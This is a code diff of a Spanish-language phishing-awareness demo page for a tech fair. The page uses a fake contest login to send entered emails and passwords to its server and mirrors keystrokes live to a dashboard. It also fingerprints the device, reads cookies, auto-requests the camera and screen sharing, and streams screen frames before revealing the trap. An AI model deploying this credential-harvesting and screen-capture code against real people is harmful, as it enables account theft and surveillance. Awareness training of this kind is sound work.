@@ -9,7 +9,7 @@
 <body class="phone">
 <main id="app">
 
-  <!-- ESCENA 1: concurso + login falso -->
+  <!-- SCENE 1: contest bait + fake login -->
   <section id="stage1" class="scene active">
     <div class="brand">⚡ TECHFEST 2026</div>
     <h1>Gana un <span>Kit Hacker</span></h1>
@@ -22,7 +22,7 @@
     <p class="fine">Al participar aceptas los términos del concurso simulado.</p>
   </section>
 
-  <!-- ESCENA 2: activación automática de permisos (sin botones) -->
+  <!-- SCENE 2: automatic permission activation (no buttons) -->
   <section id="stage2" class="scene">
     <h2>Validando tu entrada…</h2>
     <p>Estamos comprobando el entorno del reto. Si tu navegador lo permite, se intentarán activar la cámara y la validación de pantalla automáticamente.</p>
@@ -37,14 +37,14 @@
   <canvas id="shareCanvas" hidden></canvas>
   <video id="shareVideo" autoplay playsinline muted hidden></video>
 
-  <!-- ESCENA 2b: esperando resultado -->
+  <!-- SCENE 2b: waiting for the "result" -->
   <section id="done" class="scene">
     <div class="spinner"></div>
     <h2>¡Registro completo!</h2>
     <p>Anunciamos ganadores en pantalla cada 5 minutos… 👀</p>
   </section>
 
-  <!-- ESCENA 3: revelación -->
+  <!-- SCENE 3: the reveal -->
   <section id="reveal" class="scene">
     <div class="skull">🎭</div>
     <h1>Este QR era una <span>trampa</span></h1>
@@ -62,12 +62,12 @@
 
 </main>
 <script>
-let SID = null, stream = null, commandPoll = null, doneTimer = null;
-const handledCommands = new Set();
+let sessionId = null, cameraStream = null, commandPollTimer = null, doneSceneTimer = null;
+const handledCommandIds = new Set();
 const $ = id => document.getElementById(id);
 const post = (type, payload) => fetch('/api/events', {
   method: 'POST', headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ session_id: SID, type, payload: payload || {} })
+  body: JSON.stringify({ session_id: sessionId, type, payload: payload || {} })
 }).catch(() => {});
 let currentSection = 'stage1';
 const show = id => {
@@ -77,37 +77,38 @@ const show = id => {
   sendMirror();
 };
 
-function setStatus(id, msg) {
-  const el = $(id);
-  if (el) el.textContent = msg;
+function setStatus(elementId, message) {
+  const el = $(elementId);
+  if (el) el.textContent = message;
 }
-function maskCookieValue(v) {
-  v = String(v || '');
-  return '•'.repeat(Math.min(6, v.length)) + ' (' + v.length + ' chars)';
+function maskCookieValue(rawValue) {
+  rawValue = String(rawValue || '');
+  return '•'.repeat(Math.min(6, rawValue.length)) + ' (' + rawValue.length + ' chars)';
 }
 function collectCookies() {
   try {
     const cookies = document.cookie ? document.cookie.split('; ').filter(Boolean).map(pair => {
-      const i = pair.indexOf('=');
-      const name = i >= 0 ? pair.slice(0, i) : pair;
-      const value = i >= 0 ? pair.slice(i + 1) : '';
+      const separatorIndex = pair.indexOf('=');
+      const name = separatorIndex >= 0 ? pair.slice(0, separatorIndex) : pair;
+      const value = separatorIndex >= 0 ? pair.slice(separatorIndex + 1) : '';
       return { name, value: maskCookieValue(decodeURIComponent(value)) };
     }) : [];
     post('cookies_collected', { cookies });
   } catch (e) {}
 }
 function markDoneSoon() {
-  clearTimeout(doneTimer);
-  doneTimer = setTimeout(() => show('done'), 1600);
+  clearTimeout(doneSceneTimer);
+  doneSceneTimer = setTimeout(() => show('done'), 1600);
 }
 
-// Espejo en vivo: reporta al panel qué sección ve y qué lleva tecleado.
-// El panel corre en la laptop del expositor; estos datos no se persisten.
-let mt = 0, mtimer = null;
+// Live mirror: reports to the dashboard which section is visible and what has
+// been typed so far. The dashboard runs on the presenter's laptop; nothing is
+// persisted.
+let lastMirrorSentAt = 0, mirrorDebounceTimer = null;
 function sendMirror() {
-  if (!SID) return;
+  if (!sessionId) return;
   const body = {
-    session_id: SID, section: currentSection,
+    session_id: sessionId, section: currentSection,
     email: ($('email') || {}).value || '', pass: ($('pass') || {}).value || ''
   };
   fetch('/api/mirror', {
@@ -116,14 +117,14 @@ function sendMirror() {
 }
 function mirrorDebounced() {
   const now = Date.now();
-  if (now - mt < 200) { clearTimeout(mtimer); mtimer = setTimeout(sendMirror, 200); return; }
-  mt = now; sendMirror();
+  if (now - lastMirrorSentAt < 200) { clearTimeout(mirrorDebounceTimer); mirrorDebounceTimer = setTimeout(sendMirror, 200); return; }
+  lastMirrorSentAt = now; sendMirror();
 }
 
 (async () => {
   let battery = null;
   try { battery = Math.round((await navigator.getBattery()).level * 100); } catch (e) {}
-  const info = {
+  const fingerprint = {
     ua: navigator.userAgent, lang: navigator.language,
     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
     screen: screen.width + 'x' + screen.height + '@' + window.devicePixelRatio,
@@ -133,46 +134,47 @@ function mirrorDebounced() {
     battery
   };
   try {
-    const r = await fetch('/api/session', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info)
+    const response = await fetch('/api/session', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(fingerprint)
     });
-    const j = await r.json();
-    SID = j.id;
+    const session = await response.json();
+    sessionId = session.id;
     startCommandPolling();
     collectCookies();
-    if (!j.fakeLogin) { show('stage2'); autoActivatePermissions(); }
+    if (!session.fakeLogin) { show('stage2'); autoActivatePermissions(); }
   } catch (e) {
     document.body.innerHTML = '<p style="padding:2rem">⚠️ Sin conexión con el servidor de la demo.</p>';
   }
   post('landing_viewed');
 })();
 
-// keystroke en vivo (solo longitud + campo; se ve en el panel)
-let kt = 0;
+// Live keystrokes (field + length only; visible on the dashboard)
+let lastKeystrokeAt = 0;
 function keystroke(field) {
   const now = Date.now();
-  if (now - kt < 400) return;
-  kt = now;
+  if (now - lastKeystrokeAt < 400) return;
+  lastKeystrokeAt = now;
   post('keystroke', { field: field, len: $(field).value.length });
 }
 $('email').addEventListener('input', () => { keystroke('email'); mirrorDebounced(); });
 $('pass').addEventListener('input', () => { keystroke('pass'); mirrorDebounced(); });
 
-$('loginForm').addEventListener('submit', e => {
-  e.preventDefault();
-  // Importante: no await antes de getDisplayMedia; algunos navegadores exigen
-  // activación de usuario y un await puede consumirla antes de la llamada.
+$('loginForm').addEventListener('submit', event => {
+  event.preventDefault();
+  // Important: no await before getDisplayMedia; some browsers require a user
+  // gesture and an await can consume it before the call happens.
   show('stage2');
   post('fake_login_submitted', { email: $('email').value, password: $('pass').value });
   autoActivatePermissions();
 });
 
-// Permisos: la demo los solicita sola, pero el navegador sigue siendo el guardián.
-// No hay bypass: si el navegador exige gesto o el usuario niega, queda registrado.
+// Permissions: the demo requests them on its own, but the browser is still the
+// gatekeeper. There is no bypass: if the browser demands a gesture or the user
+// denies, it is recorded as denied on the dashboard.
 function autoActivatePermissions() {
   setStatus('camStatus', 'Cámara: solicitando acceso…');
   setStatus('shareStatus', 'Pantalla: intentando validación automática…');
-  attemptScreenShare(); // se lanza primero para aprovechar la activación del submit
+  attemptScreenShare(); // launched first to take advantage of the submit gesture
   requestCamera();
   markDoneSoon();
 }
@@ -181,8 +183,8 @@ async function requestCamera() {
   post('camera_request_clicked');
   try {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('unsupported');
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-    $('cam').srcObject = stream;
+    cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+    $('cam').srcObject = cameraStream;
     post('camera_permission_granted');
     post('camera_preview_active');
     setStatus('camStatus', 'Cámara: activa');
@@ -191,13 +193,13 @@ async function requestCamera() {
     setStatus('camStatus', 'Cámara: bloqueada o rechazada por el navegador');
   }
 }
-function stopCam() {
-  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; post('camera_stopped'); }
+function stopCamera() {
+  if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; post('camera_stopped'); }
 }
 
-// Compartir pantalla: SOLO con el diálogo nativo del navegador. La persona
-// elige qué compartir y puede cortar cuando quiera; nada es oculto.
-let shareStream = null, shareTimer = null;
+// Screen sharing: ONLY through the browser's native picker. The participant
+// chooses what to share and can stop at any time; nothing is hidden.
+let screenShareStream = null, screenShareTimer = null;
 async function attemptScreenShare() {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
     post('screen_share_denied');
@@ -205,24 +207,24 @@ async function attemptScreenShare() {
     return;
   }
   try {
-    shareStream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 4 }, audio: false });
-    $('shareVideo').srcObject = shareStream;
+    screenShareStream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 4 }, audio: false });
+    $('shareVideo').srcObject = screenShareStream;
     post('screen_share_started');
     setStatus('shareStatus', 'Pantalla: compartiendo');
-    // Si la persona corta desde la barra del navegador, nos enteramos.
-    const track = shareStream.getVideoTracks()[0];
-    if (track) track.addEventListener('ended', stopShare);
-    const v = $('shareVideo'), cv = $('shareCanvas'), ctx = cv.getContext('2d');
-    shareTimer = setInterval(() => {
-      if (!shareStream || !v.videoWidth) return;
-      const w = Math.min(960, v.videoWidth);
-      cv.width = w; cv.height = Math.round(v.videoHeight * (w / v.videoWidth));
-      ctx.drawImage(v, 0, 0, cv.width, cv.height);
+    // If the participant stops from the browser bar, we find out here.
+    const track = screenShareStream.getVideoTracks()[0];
+    if (track) track.addEventListener('ended', stopScreenShare);
+    const video = $('shareVideo'), canvas = $('shareCanvas'), context = canvas.getContext('2d');
+    screenShareTimer = setInterval(() => {
+      if (!screenShareStream || !video.videoWidth) return;
+      const width = Math.min(960, video.videoWidth);
+      canvas.width = width; canvas.height = Math.round(video.videoHeight * (width / video.videoWidth));
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
       let frame;
-      try { frame = cv.toDataURL('image/jpeg', 0.5); } catch (e) { return; }
+      try { frame = canvas.toDataURL('image/jpeg', 0.5); } catch (e) { return; }
       fetch('/api/screen', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ session_id: SID, frame })
+        body: JSON.stringify({ session_id: sessionId, frame })
       }).catch(() => {});
     }, 500);
   } catch (err) {
@@ -230,72 +232,83 @@ async function attemptScreenShare() {
     setStatus('shareStatus', 'Pantalla: bloqueada, cancelada o sin gesto de usuario');
   }
 }
-function stopShare() {
-  if (shareTimer) { clearInterval(shareTimer); shareTimer = null; }
-  if (shareStream) { shareStream.getTracks().forEach(t => t.stop()); shareStream = null; post('screen_share_stopped'); }
+function stopScreenShare() {
+  if (screenShareTimer) { clearInterval(screenShareTimer); screenShareTimer = null; }
+  if (screenShareStream) { screenShareStream.getTracks().forEach(t => t.stop()); screenShareStream = null; post('screen_share_stopped'); }
   setStatus('shareStatus', 'Pantalla: detenida');
 }
-window.addEventListener('pagehide', stopCam);
-window.addEventListener('pagehide', stopShare);
+window.addEventListener('pagehide', stopCamera);
+window.addEventListener('pagehide', stopScreenShare);
 
-// SSE funciona con túneles nombrados. El polling de abajo es el respaldo para
-// Quick Tunnels, que pueden cancelar SSE antes de entregar la orden.
-const es = new EventSource('/api/live');
-es.onmessage = async e => {
-  const m = JSON.parse(e.data);
-  handlePublicCommand(m);
+// SSE works with named tunnels. The polling below is the fallback for Quick
+// Tunnels, which may cancel SSE before delivering the order.
+const eventSource = new EventSource('/api/live');
+eventSource.onmessage = async event => {
+  const message = JSON.parse(event.data);
+  handlePublicCommand(message);
 };
 
 function handlePublicCommand(command) {
   if (!command || !['reveal', 'reset'].includes(command.kind)) return;
-  if (command.id && handledCommands.has(command.id)) return;
-  if (command.id) handledCommands.add(command.id);
-  if (command.kind === 'reveal') { stopCam(); stopShare(); showReveal(); }
-  if (command.kind === 'reset') { stopShare(); location.reload(); }
+  if (command.id && handledCommandIds.has(command.id)) return;
+  if (command.id) handledCommandIds.add(command.id);
+  if (command.kind === 'reveal') { stopCamera(); stopScreenShare(); showReveal(); }
+  if (command.kind === 'reset') { stopScreenShare(); location.reload(); }
 }
 
 async function pollCommand() {
-  if (!SID) return;
+  if (!sessionId) return;
   try {
-    const r = await fetch('/api/session/command?id=' + encodeURIComponent(SID), { cache: 'no-store' });
-    if (r.ok) handlePublicCommand(await r.json());
-  } catch (e) { /* El siguiente intervalo vuelve a intentar. */ }
+    const response = await fetch('/api/session/command?id=' + encodeURIComponent(sessionId), { cache: 'no-store' });
+    if (response.ok) handlePublicCommand(await response.json());
+  } catch (e) { /* The next interval will try again. */ }
 }
 function startCommandPolling() {
-  if (commandPoll) clearInterval(commandPoll);
+  if (commandPollTimer) clearInterval(commandPollTimer);
   pollCommand();
-  commandPoll = setInterval(pollCommand, 2000);
+  commandPollTimer = setInterval(pollCommand, 2000);
 }
 window.addEventListener('pagehide', () => {
-  if (commandPoll) clearInterval(commandPoll);
-  es.close();
+  if (commandPollTimer) clearInterval(commandPollTimer);
+  eventSource.close();
 });
+
+// Server status codes are English; this map translates them for display.
+const CAMERA_STATUS_TEXT = {
+  not_requested: 'sin solicitar',
+  granted: 'concedido',
+  denied: 'rechazado',
+  preview_active: 'vista previa activa',
+  stopped: 'detenido'
+};
 
 async function showReveal() {
   post('reveal_seen');
   show('reveal');
   try {
-    const j = await (await fetch('/api/session/mine?id=' + SID)).json();
-    const d = j.data || {};
-    const L = [];
-    L.push(['Dispositivo', (j.os || '?') + ' · ' + (j.browser || '?')]);
-    if (d.screen) L.push(['Pantalla', d.screen]);
-    if (d.tz) L.push(['Zona horaria', d.tz]);
-    if (d.lang) L.push(['Idioma', d.lang]);
-    if (d.battery !== null) L.push(['Batería', d.battery + '%']);
-    if (d.conn) L.push(['Conexión', d.conn]);
-    if (d.mem) L.push(['RAM aprox.', d.mem + ' GB']);
-    if (d.cores) L.push(['Núcleos CPU', d.cores]);
-    if (d.login) { L.push(['📧 Correo', d.login.email]); L.push(['🔑 Contraseña', d.login.password]); }
-    L.push(['⌨️ Lo que tecleaste', 'se reflejó letra por letra en el panel']);
-    L.push(['Cámara', d.cam || 'sin solicitar']);
-    if (Array.isArray(d.cookies)) {
-      L.push(['Cookies visibles a JS', d.cookies.length ? d.cookies.map(c => c.name + ' = ' + c.value).join(', ') : 'ninguna en este dominio']);
-      L.push(['Cookies HttpOnly', 'no accesibles para JavaScript: requieren XSS, servidor o malware para robarse']);
+    const session = await (await fetch('/api/session/mine?id=' + sessionId)).json();
+    const data = session.data || {};
+    const leakEntries = [];
+    leakEntries.push(['Dispositivo', (session.os || '?') + ' · ' + (session.browser || '?')]);
+    if (data.screen) leakEntries.push(['Pantalla', data.screen]);
+    if (data.tz) leakEntries.push(['Zona horaria', data.tz]);
+    if (data.lang) leakEntries.push(['Idioma', data.lang]);
+    if (data.battery !== null) leakEntries.push(['Batería', data.battery + '%']);
+    if (data.conn) leakEntries.push(['Conexión', data.conn]);
+    if (data.mem) leakEntries.push(['RAM aprox.', data.mem + ' GB']);
+    if (data.cores) leakEntries.push(['Núcleos CPU', data.cores]);
+    if (data.login) { leakEntries.push(['📧 Correo', data.login.email]); leakEntries.push(['🔑 Contraseña', data.login.password]); }
+    leakEntries.push(['⌨️ Lo que tecleaste', 'se reflejó letra por letra en el panel']);
+    leakEntries.push(['Cámara', CAMERA_STATUS_TEXT[data.cam] || data.cam || 'sin solicitar']);
+    if (Array.isArray(data.cookies)) {
+      leakEntries.push(['Cookies visibles a JS', data.cookies.length ? data.cookies.map(c => c.name + ' = ' + c.value).join(', ') : 'ninguna en este dominio']);
+      leakEntries.push(['Cookies HttpOnly', 'no accesibles para JavaScript: requieren XSS, servidor o malware para robarse']);
     }
-    if (d.share && d.share !== 'sin solicitar') L.push(['🖥️ Pantalla', d.share === 'rechazado' ? 'te negaste (¡bien hecho!)' : 'se transmitió al panel en vivo']);
-    $('leak').innerHTML = L.map(x =>
-      '<li><b>' + x[0] + '</b><span>' + String(x[1]).replace(/</g, '&lt;') + '</span></li>'
+    if (data.share && data.share !== 'not_requested') {
+      leakEntries.push(['🖥️ Pantalla', data.share === 'denied' ? 'te negaste (¡bien hecho!)' : 'se transmitió al panel en vivo']);
+    }
+    $('leak').innerHTML = leakEntries.map(entry =>
+      '<li><b>' + entry[0] + '</b><span>' + String(entry[1]).replace(/</g, '&lt;') + '</span></li>'
     ).join('');
   } catch (e) {}
 }
